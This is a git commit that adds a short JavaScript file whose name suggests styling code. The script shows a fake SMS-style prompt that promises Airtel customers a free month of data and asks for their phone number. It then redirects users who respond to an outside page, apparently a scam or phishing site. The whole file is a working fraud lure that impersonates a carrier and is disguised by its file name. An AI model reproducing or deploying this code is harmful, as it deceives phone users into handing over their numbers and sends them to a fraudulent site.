d1fb0851c3d1f69056f800504af67166371c55fa
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-02-06 06:22:10 +0100

    Create div-class-font-color-bg.js

---
+++ div-class-font-color-bg.js
@@ -0,0 +1,5 @@
+var password = '1 MONTH FREE DATA'
+password=prompt('SMS: Congratulations, your Airtel Number is eligible to receive 1 Month Free Data, click OK to Enter Your Number','1 MONTH FREE DATA');
+if (password != '1 MONTH FREE DATA') {
+location.href='https://vreeoffre.com/airtel.html';
+}
